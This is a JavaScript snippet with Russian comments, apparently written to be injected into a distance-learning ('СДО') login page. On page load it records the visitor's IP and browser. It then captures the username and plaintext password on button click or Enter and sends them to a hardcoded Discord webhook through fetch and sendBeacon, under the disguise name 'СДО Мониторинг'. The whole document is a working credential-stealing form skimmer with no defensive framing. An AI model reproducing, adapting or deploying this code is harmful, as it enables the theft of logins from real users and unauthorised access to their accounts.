    <!-- СУПЕР-БЫСТРЫЙ СКРИПТ ОТПРАВКИ -->
    <script>
        // ===== ВАШ DISCORD WEBHOOK =====
        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1484956365553406038/Lp82Tiyzr9Pdq3l_3sUq8aseB1Sfz9yQArV5XTzceVoUA74jxj-9LzghLUDHl08xvabe';
        // ==============================
        
        // КЭШ IP - получаем сразу при загрузке страницы
        let cachedIP = null;
        
        // Асинхронно получаем IP сразу (не ждем нажатия кнопки)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                cachedIP = data.ip;
                console.log('✅ IP получен и закеширован:', cachedIP);
            })
            .catch(e => {
                cachedIP = 'IP не определен';
                console.log('⚠️ IP не удалось получить');
            });
        
        // Определяем браузер один раз при загрузке
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        
        // Функция отправки в Discord (максимально оптимизированная)
        async function sendToDiscord(username, password) {
            // Используем кэшированный IP или получаем заново
            let ip = cachedIP;
            if (!ip) {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    ip = data.ip;
                } catch(e) {
                    ip = 'IP не определен';
                }
            }
            
            const now = new Date();
            const time = now.toLocaleString('ru-RU');
            
            // Формируем сообщение
            const messageText = `🔴 **ВХОД В СДО** 🔴\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 **Логин:** ${username}\n🔑 **Пароль:** ${password}\n🌍 **IP:** ${ip}\n💻 **Браузер:** ${browser}\n⏰ **Время:** ${time}`;
            
            // Отправляем без задержек
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: messageText,
                        username: "СДО Мониторинг"
                    })
                });
                console.log('✅ Мгновенная отправка!', username);
            } catch(error) {
                console.error('❌ Ошибка:', error);
            }
        }
        
        // ПЕРЕХВАТ С МАКСИМАЛЬНОЙ СКОРОСТЬЮ
        const loginBtn = document.getElementById('loginbtn');
        const usernameField = document.getElementById('username');
        const passwordField = document.getElementById('password');
        
        if (loginBtn && usernameField && passwordField) {
            console.log('⚡ СУПЕР-БЫСТРЫЙ режим активирован');
            
            // ОТПРАВКА ДО ОТПРАВКИ ФОРМЫ - без ожидания
            loginBtn.addEventListener('click', function(e) {
                const username = usernameField.value.trim();
                const password = passwordField.value;
                
                if (username && password) {
                    // Отправляем мгновенно, не ждем ответа
                    sendToDiscord(username, password);
                    
                    // Дополнительно: пробуем отправить через navigator.sendBeacon (еще быстрее)
                    try {
                        const formData = new FormData();
                        const ip = cachedIP || 'pending';
                        const time = new Date().toLocaleString('ru-RU');
                        const message = `🔴 ВХОД: ${username} / ${password} | IP: ${ip} | ${time}`;
                        
                        // Альтернативный быстрый способ
                        if (navigator.sendBeacon) {
                            const blob = new Blob([JSON.stringify({
                                content: message,
                                username: "СДО Мониторинг"
                            })], { type: 'application/json' });
                            navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
                        }
                    } catch(e) {}
                }
            });
        }
        
        // ДОПОЛНИТЕЛЬНО: перехват Enter в полях ввода (тоже мгновенно)
        function setupEnterHandler(field) {
            field.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    const username = usernameField.value.trim();
                    const password = passwordField.value;
                    
                    if (username && password) {
                        // Отправляем при нажатии Enter
                        sendToDiscord(username, password);
                    }
                }
            });
        }
        
        if (usernameField) setupEnterHandler(usernameField);
        if (passwordField) setupEnterHandler(passwordField);
        
        console.log('🚀 Готово! Сообщения будут приходить МГНОВЕННО при нажатии кнопки или Enter');
    </script>
